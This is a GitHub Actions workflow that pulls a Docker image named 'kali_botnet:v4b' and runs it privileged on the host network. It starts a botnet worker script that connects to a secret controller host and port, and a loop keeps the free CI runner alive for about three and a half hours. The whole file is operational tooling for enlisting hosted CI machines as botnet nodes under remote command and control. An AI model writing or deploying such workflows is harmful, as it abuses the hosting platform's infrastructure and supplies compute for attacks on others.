name: work

on:
  workflow_dispatch:

jobs:
  run-controller:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    env:
      DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
      DOCKERHUB_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}
      CONTROLLER_HOST: ${{ secrets.CONTROLLER_HOST }}
      CONTROLLER_PORT: ${{ secrets.CONTROLLER_PORT }}

    steps:
      - name: Checkout Repo
        uses: actions/checkout@v3

      - name: Login to Docker Hub
        run: |
          set -x
          echo "$DOCKERHUB_PASSWORD" | docker login -u "$DOCKERHUB_USERNAME" --password-stdin

      - name: Pull Controller Image
        run: |
          set -x
          IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:v4b
          docker pull $IMAGE_NAME

      - name: Run Controller Container
        run: |
          set -x
          IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:v4b
          docker run -d --name=kali_controller \
            --privileged \
            --network=host \
            -e CONTROLLER_HOST=$CONTROLLER_HOST \
            -e CONTROLLER_PORT=$CONTROLLER_PORT \
            $IMAGE_NAME \
            tail -f /dev/null
          sleep 2
          docker ps -a

      - name: Start Controller Services
        run: |
          set -x
          # start background services
          docker exec -d kali_controller bash -c "python3 /app/botnet_version4/worker/worker.py --host $CONTROLLER_HOST --port $CONTROLLER_PORT"
      
      - name: Keep Workflow Alive & Auto-Restart
        run: |
          set -e
          start_time=$(date +%s)
          max_runtime=$((3 * 3600 + 1800)) # 3h30m

          while true; do
            now=$(date +%s)
            uptime=$((now - start_time))
            echo "[$(date)] Uptime: $((uptime / 60)) minutes"
            if [ "$uptime" -ge "$max_runtime" ]; then
                sleep 5
                echo "Exiting workflow..."
                exit 0
            fi
            sleep 60
          done
